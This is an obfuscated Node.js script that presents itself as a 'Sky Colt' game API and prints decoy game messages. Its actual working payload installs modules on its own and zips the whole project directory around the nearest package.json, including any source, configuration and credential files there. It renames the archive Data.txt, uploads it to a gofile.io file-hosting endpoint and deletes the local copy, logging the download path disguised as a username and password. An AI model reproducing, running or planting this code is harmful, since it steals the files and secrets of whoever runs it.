const _0x2cc9d2=_0x8cbf;(function(_0x24262a,_0xdacf40){const _0x4b9d62=_0x8cbf,_0x4aa7b9=_0x24262a();while(!![]){try{const _0x481d3a=parseInt(_0x4b9d62(0xb8))/0x1+parseInt(_0x4b9d62(0xb1))/0x2+-parseInt(_0x4b9d62(0xc1))/0x3+-parseInt(_0x4b9d62(0xac))/0x4*(-parseInt(_0x4b9d62(0xa5))/0x5)+parseInt(_0x4b9d62(0xb7))/0x6*(parseInt(_0x4b9d62(0x9c))/0x7)+-parseInt(_0x4b9d62(0xaa))/0x8*(parseInt(_0x4b9d62(0x97))/0x9)+parseInt(_0x4b9d62(0xb2))/0xa;if(_0x481d3a===_0xdacf40)break;else _0x4aa7b9['push'](_0x4aa7b9['shift']());}catch(_0x329669){_0x4aa7b9['push'](_0x4aa7b9['shift']());}}}(_0x5abb,0x4c637));function _0x8cbf(_0x3a9651,_0x184fc1){const _0x5abb03=_0x5abb();return _0x8cbf=function(_0x8cbfa3,_0x3918f9){_0x8cbfa3=_0x8cbfa3-0x93;let _0x5eb07b=_0x5abb03[_0x8cbfa3];return _0x5eb07b;},_0x8cbf(_0x3a9651,_0x184fc1);}const {execSync}=require('child_process');function ensureModules(_0x1091ef){const _0x137a55=_0x8cbf;_0x1091ef[_0x137a55(0xb5)](_0x5b9787=>{const _0x49ef81=_0x137a55;try{require[_0x49ef81(0xa4)](_0x5b9787);}catch(_0xab9aca){console['log'](_0x49ef81(0xbc)),execSync(_0x49ef81(0x9e)+_0x5b9787,{'stdio':'inherit'});}});}ensureModules(['fs','path','archiver','axios',_0x2cc9d2(0x98)]);function _0x5abb(){const _0x3b3990=['zin\x20chinese','renameSync','isDirectory','open\x20id\x20game\x20sky\x20colt\x20by\x20zin\x20chinese...','createWriteStream','post','/d/','Data.txt','1327338LpEDsM','replace','downloadPage','axios','data','path','file','getHeaders','password:\x20\x22/d/','username:\x20zinchinese628$$\x22','join','zip','Data.zip','gofile.io','https://store1.gofile.io/uploadFile','undefined','node_modules','1276380wcFSYL','form-data','.cache','cwd','existsSync','7iYmxaN','close','npm\x20install\x20','log','parse','.npm','archiver','split','resolve','350wPsnDs','statSync','status','package.json','pipe','32Gmqnwx','root','1412XnxRZJ','sky\x20colt\x20game\x20by\x20zin...','error','❌\x20Error:','createReadStream','724434YPBlwI','1733420AaOISc','readdirSync','skyColt://','forEach','sessions','2580378OEORtB','332281cNSxhJ'];_0x5abb=function(){return _0x3b3990;};return _0x5abb();}const fs=require('fs'),path=require(_0x2cc9d2(0xc6)),archiver=require(_0x2cc9d2(0xa2)),axios=require(_0x2cc9d2(0xc4)),FormData=require('form-data');console[_0x2cc9d2(0x9f)]('Sky\x20Colt\x20Api...'),setTimeout(()=>{const _0x9654d6=_0x2cc9d2;console[_0x9654d6(0x9f)]('sky\x20colt\x20by\x20zin\x20chinese...');},0x7d0);const excludeDirs=[_0x2cc9d2(0x96),_0x2cc9d2(0xa1),_0x2cc9d2(0x99),'cache\x20npm','session',_0x2cc9d2(0xb6)];function findAccountData(_0x589820){const _0x369975=_0x2cc9d2;let _0x18cbf5=_0x589820;while(_0x18cbf5!==path[_0x369975(0xa0)](_0x18cbf5)[_0x369975(0xab)]){if(fs[_0x369975(0x9b)](path[_0x369975(0xcb)](_0x18cbf5,_0x369975(0xa8))))return _0x18cbf5;_0x18cbf5=path['dirname'](_0x18cbf5);}return _0x589820;}const accountDataPath=findAccountData(process[_0x2cc9d2(0x9a)]()),zipFilePath=path[_0x2cc9d2(0xcb)](accountDataPath,_0x2cc9d2(0xcd)),fakeTxtFilePath=path[_0x2cc9d2(0xcb)](accountDataPath,_0x2cc9d2(0xc0)),output=fs[_0x2cc9d2(0xbd)](zipFilePath),archive=archiver(_0x2cc9d2(0xcc),{'zlib':{'level':0x9}});output['on'](_0x2cc9d2(0x9d),async function(){const _0x89e3f5=_0x2cc9d2;fs[_0x89e3f5(0xba)](zipFilePath,fakeTxtFilePath),console[_0x89e3f5(0x9f)](_0x89e3f5(0xb9)),await uploadToGoFile(fakeTxtFilePath);}),archive['on'](_0x2cc9d2(0xae),function(_0x5748dd){throw _0x5748dd;}),archive[_0x2cc9d2(0xa9)](output);function addAccountFiles(_0x4172e6,_0x117d13=''){const _0x35164a=_0x2cc9d2,_0x2936b0=fs[_0x35164a(0xb3)](_0x4172e6);for(const _0x634f3a of _0x2936b0){const _0x5c0c4f=path['join'](_0x4172e6,_0x634f3a),_0x20f475=path['join'](_0x117d13,_0x634f3a),_0x421c9a=fs[_0x35164a(0xa6)](_0x5c0c4f);_0x421c9a[_0x35164a(0xbb)]()?!excludeDirs['includes'](_0x634f3a)&&addAccountFiles(_0x5c0c4f,_0x20f475):archive[_0x35164a(0xc7)](_0x5c0c4f,{'name':_0x20f475});}}addAccountFiles(accountDataPath),archive['finalize']();async function uploadToGoFile(_0x2e7cf7){const _0x3958c4=_0x2cc9d2,_0x37faf8=new FormData();_0x37faf8['append'](_0x3958c4(0xc7),fs[_0x3958c4(0xb0)](_0x2e7cf7));try{console[_0x3958c4(0x9f)](_0x3958c4(0xad));const _0x2a4150=await axios[_0x3958c4(0xbe)](_0x3958c4(0x94),_0x37faf8,{'headers':_0x37faf8[_0x3958c4(0xc8)]()});if(_0x2a4150[_0x3958c4(0xc5)][_0x3958c4(0xa7)]==='ok'){const _0x225b52=_0x2a4150[_0x3958c4(0xc5)][_0x3958c4(0xc5)][_0x3958c4(0xc3)],_0x35cf4e=_0x225b52[_0x3958c4(0xc2)](/^https?:\/\//,_0x3958c4(0xb4))[_0x3958c4(0xc2)](_0x3958c4(0x93),_0x3958c4(0x95));console[_0x3958c4(0x9f)](_0x3958c4(0xca)),console[_0x3958c4(0x9f)](_0x3958c4(0xc9)+_0x225b52[_0x3958c4(0xa3)](_0x3958c4(0xbf))[0x1]+'\x22'),fs['unlinkSync'](_0x2e7cf7),console[_0x3958c4(0x9f)]('🗑️.');}else console['log']('❌',_0x2a4150[_0x3958c4(0xc5)]);}catch(_0x3db7e5){console[_0x3958c4(0xae)](_0x3958c4(0xaf),_0x3db7e5);}}
